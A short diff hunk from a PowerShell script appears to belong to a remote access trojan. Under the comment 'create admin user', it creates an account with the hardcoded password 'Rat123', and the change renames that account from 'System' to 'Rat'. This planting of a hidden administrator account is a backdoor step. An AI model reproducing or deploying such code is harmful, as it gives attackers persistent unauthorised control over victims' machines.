@@ -30,7 +30,7 @@ $path = "$env:temp/$wd"
 $initial_dir = Get-Location
 
 # create admin user
-$uname = System
+$uname = Rat
 $pword = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
 Create_account -uname $uname -pword $pword
 
